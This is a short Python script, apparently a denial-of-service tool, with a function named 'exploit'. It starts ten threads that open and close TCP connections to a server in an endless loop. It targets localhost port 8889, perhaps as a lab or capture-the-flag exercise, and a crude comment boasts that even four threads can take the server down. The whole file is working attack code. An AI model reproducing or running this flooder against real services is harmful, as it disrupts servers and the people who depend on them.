#!/usr/bin/pypy
import socket
import threading

def exploit(ip,port):
    print('init success',ip,port)
    while True:
        try:
            s = socket.socket()
            s.connect((ip,port))
        except KeyboardInterrupt:
            s.close()
            exit()
        except socket.error as e:
            pass
        except Exception as e:
            print(e)
            pass
        finally:
            s.close()

def multi(ip,port):
    global threadnum
    pool = []
    for _ in range(threadnum):
        thr = threading.Thread(target = exploit,args=(ip,port))
        pool.append(thr)
        thr.start()
    
ip ='127.0.0.1'
port = 8889
threadnum = 10 # guess cpu?  perhaps 4 threads can also fuck the server >.<
if __name__ == '__main__':
    multi(ip,port)
